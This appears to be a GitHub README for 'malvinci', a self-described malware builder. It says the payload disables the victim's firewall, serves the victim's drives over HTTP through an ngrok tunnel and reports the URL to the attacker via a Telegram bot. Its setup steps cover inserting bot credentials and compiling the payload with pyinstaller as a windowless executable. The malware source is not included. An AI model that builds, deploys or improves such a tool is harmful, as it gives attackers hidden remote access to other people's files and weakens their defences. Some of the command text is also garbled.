# malvinci
This simple script will introduce a new type of malware that will turn off the firewall, start an HTTP server, forward its port through ngrok, and send the URL of the server through a Telegram bot.


You will need to create a new Telegram BOT. Follow the steps here to create one! [Follow the steps](https://core.telegram.org/bots#6-botfather)

# How to setup

Before running this program edit the payload.py file

* Replace "botttoken" with your Telegram Bot API key.

* Replace "chatid" with your Telegram Bot's Chat ID.

## How To Use 

```bash
# Install dependencies 
$ python3 , pip
$ py -3 -m pip install -r requirements.txt
$ in order to change the drive you accesing use this parametre change_drive?drive=$Drive

# Building the payload

$ Replace the bot token And Chatid Cred in the file
$ Now compile the payload code using pyinstaller 
$ pyinstaller --noconfirm --onefile --windowed   payload.py 

```
